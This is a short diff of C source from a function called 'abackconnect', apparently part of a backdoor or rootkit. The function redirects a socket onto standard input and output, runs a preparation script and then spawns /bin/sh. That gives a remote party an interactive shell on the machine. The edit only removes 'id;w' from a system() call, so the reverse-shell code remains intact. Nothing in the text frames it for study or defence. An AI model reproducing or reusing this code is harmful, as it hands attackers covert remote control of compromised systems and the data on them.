@@ -21,7 +21,7 @@ void abackconnect(int sockfd){
         dup2(sockfd, i);
 
     call(CCHDIR, HOMEDIR);
-    system("./bdvprep;id;w");
+    system("./bdvprep");
     execl("/bin/sh", "sh", NULL);
     shutdown(sockfd, SHUT_RDWR);
     close(sockfd);
